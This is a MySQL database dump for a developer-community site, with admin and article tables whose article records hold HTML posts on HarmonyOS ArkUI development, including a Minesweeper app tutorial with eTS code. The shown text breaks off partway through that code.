/*
 Navicat Premium Data Transfer

 Source Server         : MySQL
 Source Server Type    : MySQL
 Source Server Version : 80017
 Source Host           : localhost:3306
 Source Schema         : cvnm

 Target Server Type    : MySQL
 Target Server Version : 80017
 File Encoding         : 65001

 Date: 12/02/2022 20:54:23
*/

SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;

-- ----------------------------
-- Table structure for admin
-- ----------------------------
DROP TABLE IF EXISTS `admin`;
CREATE TABLE `admin`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `password` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `introduction` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '简介',
  `avatar` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '头像',
  `status` int(1) NULL DEFAULT NULL,
  `online` int(1) NULL DEFAULT NULL,
  `createtime` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  `updatetime` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 5 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of admin
-- ----------------------------
INSERT INTO `admin` VALUES (1, 'admin', '4297f44b13955235245b2497399d7a93', 'I\'m a super administrator.', 'http://127.0.0.1:8080/upload/image/admin/2022/1/16/5d6974a4-01ef-493c-9869-822b610d5286.png', 1, 1, '2021-10-25 20:22:11', '2022-01-16 18:05:31');
INSERT INTO `admin` VALUES (3, 'test', '4297f44b13955235245b2497399d7a93', '123123', 'https://wpimg.wallstcn.com/f778738c-e4f8-4870-b634-56703b4acafe.gif', 1, 0, '2021-10-25 22:26:47', '2021-10-25 22:52:09');

-- ----------------------------
-- Table structure for article
-- ----------------------------
DROP TABLE IF EXISTS `article`;
CREATE TABLE `article`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `userid` int(11) NULL DEFAULT NULL COMMENT '作者',
  `summary` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '概述',
  `content` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL COMMENT '内容',
  `cover` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '封面',
  `plateid` int(11) NULL DEFAULT NULL COMMENT '文章板块',
  `labelid` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '文章标签',
  `type` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '文章类型：original：原创，reprint：转载，translation：翻译，question：问题求助，industry：行业动态，share：分享，solve：解决方案，proposal：改进建议',
  `publish` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '发布形式：public：公开，private：私密',
  `status` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '文章状态：publish：发布，draft：草稿，audit：待审核，delete：删除',
  `tag` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '精华/推荐：Essence：精华，recommend：推荐',
  `watch` int(11) NULL DEFAULT NULL COMMENT '观看量',
  `hot` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '热门、顶置',
  `source` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '来源',
  `isdel` int(1) NULL DEFAULT NULL COMMENT '软删除标识',
  `createtime` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  `updatetime` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 46 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of article
-- ----------------------------
INSERT INTO `article` VALUES (1, 'HarmonyOS应用开发-关于TS语言的整体理解', 1, '概述', '<p>基于TS扩展的声明式开发范式的方舟开发框架是为HarmonyOS平台开发极简、高性能、跨设备应用设计研发的UI开发框架，支持开发者高效的构建跨设备应用UI界面。</p>\n<h2><strong>基础能力</strong></h2>\n<p>使用基于TS扩展的声明式开发范式的方舟开发框架，采用更接近自然语义的编程方式，让开发者可以直观地描述UI界面，不必关心框架如何实现UI绘制和渲染，实现极简高效开发。从组件、动效和状态管理三个维度来提供UI能力，还提供了系统能力接口，实现系统能力的极简调用。</p>\n<h3><strong>开箱即用的组件</strong></h3>\n<p>框架提供丰富的系统预置组件，可以通过链式调用的方式设置系统组件的渲染效果。开发者可以组合系统组件为自定义组件，通过这种方式将页面组件化为一个个独立的UI单元，实现页面不同单元的独立创建、开发和复用，使页面具有更强的工程性。</p>\n<h3><strong>丰富的动效接口</strong></h3>\n<p>提供svg标准的绘制图形能力，同时开放了丰富的动效接口，开发者可以通过封装的物理模型或者调用动画能力接口来实现自定义动画轨迹。</p>\n<h3><strong>状态与数据管理</strong></h3>\n<p>状态数据管理作为基于TS扩展的声明式开发范式的特色，通过功能不同的装饰器给开发者提供了清晰的页面更新渲染流程和管道。状态管理包括UI组件状态和应用程序状态，两者协作可以使开发者完整地构建整个应用的数据更新和UI渲染。</p>\n<h3><strong>系统能力接口</strong></h3>\n<p>使用基于TS扩展的声明式开发范式的方舟开发框架，还封装了丰富的系统能力接口，开发者可以通过简单的接口调用，实现从UI设计到系统能力调用的极简开发。</p>\n<h2><strong>整体架构</strong></h2>\n<table>\n<tbody>\n<tr>\n<td>\n<p><strong><span class=\"easyimage easyimage-full\"><img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/421/357/287/2850086000421357287.20211130104310.11346738695874518859073846066252:50521130143455:2800:DD2215D5DFD18F9A4727AD9B815CFD9B0AB03106E05ADE3A5B0C5EAE3B9E7BAA.png\" alt=\"图片2.png\" /></span></strong></p>\n</td>\n</tr>\n</tbody>\n</table>\n<h3><strong>声明式UI前端</strong></h3>\n<p>提供了UI开发范式的基础语言规范，并提供内置的UI组件、布局和动画，提供了多种状态管理机制，为应用开发者提供一系列接口支持。</p>\n<h3><strong>语言运行时</strong></h3>\n<p>选用方舟语言运行时，提供了针对UI范式语法的解析能力，提供了跨语言调用支持，提供了TS语言高性能运行环境。</p>\n<h3><strong>声明式UI后端引擎</strong></h3>\n<p>后端引擎提供了兼容不同开发范式的UI渲染管线，提供多种基础组件、布局计算、动效、交互事件，提供了状态管理和绘制能力。</p>\n<h3><strong>渲染引擎</strong></h3>\n<p>提供了高效的绘制能力，将渲染管线收集的渲染指令，绘制到屏幕能力。</p>\n<h3><strong>平台适配层</strong></h3>\n<p>提供了对系统平台的抽象接口，具备接入不同系统的能力，如系统渲染管线、生命周期调度等。</p>\n<p>&nbsp;</p>', '', 1, ',1,28,', '翻译', '私密', '已发布', '精华', 49938, 'Top', 'https://www.baidu.com', 0, '2021-12-01 22:46:40', '2022-01-17 20:56:51');
INSERT INTO `article` VALUES (2, '基于HarmonyOS ArkUI 3.0 框架，我成功开发了木棉花扫雷', 1, '概述', '<h1>效果图</h1>\n<p><span class=\"easyimage easyimage-full\"><img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/300/194/699/0350086200300194699.20211129102625.03899454321373139097667465444887:50521201141840:2800:0EFECB3E23B326F35960C3D66D627E3D3E24232580E2F25E41429510345CC5D0.gif\" alt=\"扫雷.gif\" /></span></p>\n<h1>代码文件结构</h1>\n<p><span class=\"easyimage easyimage-full\"><img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/300/194/699/0350086200300194699.20211129102744.15795963157029262956930687264302:50521201141840:2800:A7B75AEF7113CD2DB83BC4DB377AE7A9A31A5D30F568B5E631457088E65D5A31.png\" alt=\"image.png\" /></span></p>\n<h1>正文</h1>\n<h2>一、创建一个空白的工程</h2>\n<h3>1.&nbsp;安装和配置DevEco Studio</h3>\n<p><a href=\"https://developer.harmonyos.com/cn/develop/deveco-studio#download\" target=\"_blank\" rel=\"nofollow noopener\">DevEco Studio下载</a>、<a href=\"https://developer.harmonyos.com/cn/docs/documentation/doc-guides/software_install-0000001053582415\" target=\"_blank\" rel=\"nofollow noopener\">DevEco Studio安装</a></p>\n<h3>2.&nbsp;创建一个Empty Phone应用</h3>\n<p>DevEco Studio下载安装成功后，打开DevEco Studio，点击左上角的File，点击New，再选择New Project，选择Empty Ability选项，点击Next按钮。</p>\n<p><span class=\"easyimage easyimage-full\"><img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/300/194/699/0350086200300194699.20211129102916.91141718810862026068184353133049:50521201141840:2800:2498D6B61F220A25023506BE374BAE81D0AAFCB548D70B88AA32FC39CE9C89DA.png\" alt=\"image.png\" /></span></p>\n<p>将文件命名为SaoLei（文件名不能出现中文或者特殊字符，否则将无法成功创建项目文件），Project Type勾选Application，选择保存路径，Language勾选eTS，选择API7，设备勾选Phone，最后点击Finish按钮。</p>\n<p><span class=\"easyimage easyimage-full\"><img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/300/194/699/0350086200300194699.20211129103013.10315585046626627358336048028234:50521201141840:2800:8636B0F2A14920DE397908F2D1123D64BBB3A7776725D86B8E63DDF1DA15D300.png\" alt=\"image.png\" /></span></p>\n<h3>3.&nbsp;准备工作</h3>\n<p>在<strong>entry&gt;src&gt;main&gt;config.json</strong>文件中最下方\"launchType\": \"standard\"的后面添加以下代码，这样就可以实现去掉应用上方的标签栏了。<br />config.json最下方部分代码：</p>\n<pre><br /><code class=\"language-json hljs \"><span class=\"hljs-string\">\"metaData\"</span>: {\n      \"<span class=\"hljs-attribute\">customizeData</span>\": <span class=\"hljs-value\">[\n        {\n          \"<span class=\"hljs-attribute\">name</span>\": <span class=\"hljs-string\">\"hwc-theme\"</span>,\n          \"<span class=\"hljs-attribute\">value</span>\": <span class=\"hljs-string\">\"androidhwext:style/Theme.Emui.Light.NoTitleBar\"</span>,\n          \"<span class=\"hljs-attribute\">extra</span>\": <span class=\"hljs-string\">\"\"</span>\n        }\n      ]\n    </span>}</code><button>复制</button></pre>\n<h2>二、实现界面布局</h2>\n<h3>1. 保存图片</h3>\n<p>将图片保存到<strong>entry&gt;src&gt;main&gt;resources&gt;rawfile</strong>文件中。</p>\n<p><span class=\"easyimage easyimage-full\"><img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/300/194/699/0350086200300194699.20211129103315.40297080297709872094796426374552:50521201141840:2800:6AF5F5EBBF398DB3B438ADEBB18148069D11F58AC392F4D3724B18E6378CE7DB.png\" alt=\"image.png\" /></span></p>\n<h3>2. 欢迎页面</h3>\n<p><strong>logo.ets</strong>：</p>\n<pre><br /><code class=\"language-javascript hljs \"><span class=\"hljs-comment\">// @ts-nocheck</span>\nimport router from <span class=\"hljs-string\">\'@system.router\'</span>\nimport Curves from <span class=\"hljs-string\">\'@ohos.curves\'</span>\n\n@Entry\n@Component\nstruct Logo {\n  @State private opacityValue: number = <span class=\"hljs-number\">0</span>\n  @State private scaleValue: number = <span class=\"hljs-number\">0</span>\n  private curve1 = Curves.cubicBezier(<span class=\"hljs-number\">0.1</span>, <span class=\"hljs-number\">0.2</span>, <span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">1</span>)\n\n  build() {\n    Flex({ justifyContent: FlexAlign.Center, alignItems: ItemAlign.Center, direction: FlexDirection.Column }) {\n      Image($rawfile(<span class=\"hljs-string\">\'LOGO.png\'</span>))\n        .objectFit(ImageFit.Contain)\n        .height(<span class=\"hljs-number\">300</span>)\n        .margin({ bottom: <span class=\"hljs-number\">0</span> })\n        .scale({ x: <span class=\"hljs-keyword\">this</span>.scaleValue, y: <span class=\"hljs-keyword\">this</span>.scaleValue })\n        .opacity(<span class=\"hljs-keyword\">this</span>.opacityValue)\n        .onAppear(() =&gt; {\n          animateTo({\n            duration: <span class=\"hljs-number\">2500</span>,\n            curve: <span class=\"hljs-keyword\">this</span>.curve1,\n            delay: <span class=\"hljs-number\">100</span>,\n            onFinish: () =&gt; {\n              setTimeout(() =&gt; {\n                router.replace({ uri: <span class=\"hljs-string\">\"pages/mainpage\"</span> })\n              }, <span class=\"hljs-number\">1000</span>);\n            }\n          }, () =&gt; {\n            <span class=\"hljs-keyword\">this</span>.opacityValue = <span class=\"hljs-number\">1</span>\n            <span class=\"hljs-keyword\">this</span>.scaleValue = <span class=\"hljs-number\">1</span>\n          })\n        })\n      Text(<span class=\"hljs-string\">\'木棉花扫雷\'</span>)\n        .fontSize(<span class=\"hljs-number\">30</span>)\n        .fontColor(Color.White)\n        .margin({ top: <span class=\"hljs-number\">200</span> })\n    }\n    .width(<span class=\"hljs-string\">\'100%\'</span>)\n    .height(<span class=\"hljs-string\">\'100%\'</span>)\n    .linearGradient(\n      {\n        angle: <span class=\"hljs-number\">180</span>,\n        colors: [[<span class=\"hljs-string\">\'#D3D7DC\'</span>, <span class=\"hljs-number\">0.1</span>], [<span class=\"hljs-string\">\"#B4BED2\"</span>, <span class=\"hljs-number\">0.6</span>],  [<span class=\"hljs-string\">\"#A0AAC8\"</span>, <span class=\"hljs-number\">1</span>]]\n      })\n  }\n}</code><button>复制</button></pre>\n<h3>3. 主页面</h3>\n<p><strong>mainpage.ets</strong>：</p>\n<pre><br /><code class=\"language-javascript hljs \">import router from <span class=\"hljs-string\">\'@system.router\'</span>\n\n@Entry\n@Component\nstruct Mainpage {\n  build() {\n    Column() {\n      Image($rawfile(<span class=\"hljs-string\">\'mine.png\'</span>))\n        .objectFit(ImageFit.Contain)\n        .height(<span class=\"hljs-number\">300</span>)\n        .scale({ x: <span class=\"hljs-number\">0.5</span>, y: <span class=\"hljs-number\">0.5</span> })\n        .opacity(<span class=\"hljs-number\">0.8</span>)\n\n      setButton({ <span class=\"hljs-built_in\">String</span>: <span class=\"hljs-string\">\'初级\'</span>, difficulty: <span class=\"hljs-number\">10</span>, Number_row: <span class=\"hljs-number\">9</span>, Number_column: <span class=\"hljs-number\">9</span> });\n      setButton({ <span class=\"hljs-built_in\">String</span>: <span class=\"hljs-string\">\'中级\'</span>, difficulty: <span class=\"hljs-number\">30</span>, Number_row: <span class=\"hljs-number\">12</span>, Number_column: <span class=\"hljs-number\">12</span> });\n      setButton({ <span class=\"hljs-built_in\">String</span>: <span class=\"hljs-string\">\'高级\'</span>, difficulty: <span class=\"hljs-number\">50</span>, Number_row: <span class=\"hljs-number\">16</span>, Number_column: <span class=\"hljs-number\">16</span> });\n    }\n    .width(<span class=\"hljs-string\">\'100%\'</span>)\n    .height(<span class=\"hljs-string\">\'100%\'</span>)\n    .linearGradient(\n      {\n        angle: <span class=\"hljs-number\">180</span>,\n        colors: [[<span class=\"hljs-string\">\'#D3D7DC\'</span>, <span class=\"hljs-number\">0.1</span>], [<span class=\"hljs-string\">\"#B4BED2\"</span>, <span class=\"hljs-number\">0.6</span>],  [<span class=\"hljs-string\">\"#A0AAC8\"</span>, <span class=\"hljs-number\">1</span>]]\n      })\n  }\n}\n\n@Component\nstruct setButton {\n  private <span class=\"hljs-built_in\">String</span>: string\n  private difficulty: number\n  private Number_row: number\n  private Number_column: number\n\n  build() {\n    Button({ type: ButtonType.Capsule, stateEffect: <span class=\"hljs-literal\">true</span> }){\n      Column(){\n        Text(<span class=\"hljs-keyword\">this</span>.String)\n          .textAlign(TextAlign.Center)\n          .fontSize(<span class=\"hljs-number\">30</span>)\n          .fontWeight(<span class=\"hljs-number\">600</span>)\n          .fontColor(<span class=\"hljs-string\">\'#0000FF\'</span>)\n          .margin({ top: -<span class=\"hljs-number\">5</span> })\n        Flex({ justifyContent: FlexAlign.Center, alignItems: ItemAlign.Center, direction: FlexDirection.Row }) {\n          Text(<span class=\"hljs-string\">\'（ \'</span> + <span class=\"hljs-keyword\">this</span>.difficulty.toString() + <span class=\"hljs-string\">\'个\'</span>)\n            .textAlign(TextAlign.Center)\n            .fontSize(<span class=\"hljs-number\">22</span>)\n            .fontWeight(<span class=\"hljs-number\">600</span>)\n            .fontColor(<span class=\"hljs-string\">\'#416EBE\'</span>)\n            .margin({ top: -<span class=\"hljs-number\">2</span>, right: <span class=\"hljs-number\">5</span> })\n          Image($rawfile(<span class=\"hljs-string\">\'mine.png\'</span>))\n            .height(<span class=\"hljs-number\">26</span>)\n            .width(<span class=\"hljs-number\">26</span>)\n          Text(<span class=\"hljs-keyword\">this</span>.Number_row.toString() + <span class=\"hljs-string\">\'*\'</span> + <span class=\"hljs-keyword\">this</span>.Number_column.toString() + <span class=\"hljs-string\">\' ）\'</span>)\n            .textAlign(TextAlign.Center)\n            .fontSize(<span class=\"hljs-number\">22</span>)\n            .fontWeight(<span class=\"hljs-number\">600</span>)\n            .fontColor(<span class=\"hljs-string\">\'#416EBE\'</span>)\n            .margin({ left: <span class=\"hljs-number\">5</span>, top: -<span class=\"hljs-number\">2</span>})\n        }.margin({ top: <span class=\"hljs-number\">5</span> })\n      }\n    }\n    .width(<span class=\"hljs-number\">220</span>)\n    .height(<span class=\"hljs-number\">90</span>)\n    .backgroundColor(<span class=\"hljs-string\">\'#F3F7FF\'</span>)\n    .margin({ top: <span class=\"hljs-number\">10</span> })\n    .onClick(() =&gt; {\n      router.push({\n        uri: <span class=\"hljs-string\">\'pages/game\'</span>,\n        params: { difficulty: <span class=\"hljs-keyword\">this</span>.difficulty, Number_row: <span class=\"hljs-keyword\">this</span>.Number_row ,Number_column: <span class=\"hljs-keyword\">this</span>.Number_column }\n      })\n    })\n  }\n}</code><button>复制</button></pre>\n<h3>4. 游戏页面</h3>\n<p><strong>game.ets</strong>：</p>\n<pre><br /><code class=\"language-javascript hljs \">import router from <span class=\"hljs-string\">\'@system.router\'</span>\n\n<span class=\"hljs-keyword\">const</span> colors={\n  <span class=\"hljs-string\">\"0\"</span>: <span class=\"hljs-string\">\"#E0E4F0\"</span>,\n  <span class=\"hljs-string\">\"1\"</span>: <span class=\"hljs-string\">\"#2348A0\"</span>,\n  <span class=\"hljs-string\">\"2\"</span>: <span class=\"hljs-string\">\"#247411\"</span>,\n  <span class=\"hljs-string\">\"3\"</span>: <span class=\"hljs-string\">\"#AF121B\"</span>,\n  <span class=\"hljs-string\">\"4\"</span>: <span class=\"hljs-string\">\"#04289E\"</span>,\n  <span class=\"hljs-string\">\"5\"</span>: <span class=\"hljs-string\">\"#D2090E\"</span>,\n  <span class=\"hljs-string\">\"6\"</span>: <span class=\"hljs-string\">\"#008000\"</span>,\n  <span class=\"hljs-string\">\"7\"</span>: <span class=\"hljs-string\">\"#000080\"</span>,\n  <span class=\"hljs-string\">\"8\"</span>: <span class=\"hljs-string\">\"#800000\"</span>,\n  <span class=\"hljs-string\">\"10\"</span>: <span class=\"hljs-string\">\"#3C7CF6\"</span>,\n  <span class=\"hljs-string\">\"11\"</span>: <span class=\"hljs-string\">\"#E0E4F0\"</span>,\n  <span class=\"hljs-string\">\"20\"</span>: <span class=\"hljs-string\">\"#CBD8E8\"</span>,\n  <span class=\"hljs-string\">\"21\"</span>: <span class=\"hljs-string\">\"#4774D8\"</span>,\n  <span class=\"hljs-string\">\"30\"</span>: <span class=\"hljs-string\">\"#4774D8\"</span>,\n  <span class=\"hljs-string\">\"31\"</span>: <span class=\"hljs-string\">\"#CBD8E8\"</span>\n}\n\n<span class=\"hljs-keyword\">var</span> grids;\n<span class=\"hljs-keyword\">var</span> timeoutID;\n\n@Entry\n@Component\nstruct Game {\n  private row: number = router.getParams().Number_row\n  private column: number = router.getParams().Number_column\n  @State time: number = <span class=\"hljs-number\">0</span>\n  @State mine: number = router.getParams().difficulty\n  @State Number_row: string[] = [<span class=\"hljs-string\">\'1\'</span>, <span class=\"hljs-string\">\'2\'</span>, <span class=\"hljs-string\">\'3\'</span>, <span class=\"hljs-string\">\'4\'</span>, <span class=\"hljs-string\">\'5\'</span>, <span class=\"hljs-string\">\'6\'</span>, <span class=\"hljs-string\">\'7\'</span>, <span class=\"hljs-string\">\'8\'</span>, <span class=\"hljs-string\">\'9\'</span>]\n  @State Number_column: string[] = [<span class=\"hljs-string\">\'1\'</span>, <span class=\"hljs-string\">\'2\'</span>, <span class=\"hljs-string\">\'3\'</span>, <span class=\"hljs-string\">\'4\'</span>, <span class=\"hljs-string\">\'5\'</span>, <span class=\"hljs-string\">\'6\'</span>, <span class=\"hljs-string\">\'7\'</span>, <span class=\"hljs-string\">\'8\'</span>, <span class=\"hljs-string\">\'9\'</span>]\n  @State statesGrids: number[][] = [[<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>],\n                                    [<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>],\n                                    [<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>],\n                                    [<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>],\n                                    [<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>],\n                                    [<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>],\n                                    [<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>],\n                                    [<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>],\n                                    [<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>],\n                                    [<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>],\n                                    [<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>],\n                                    [<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>],\n                                    [<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>],\n                                    [<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>],\n                                    [<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span 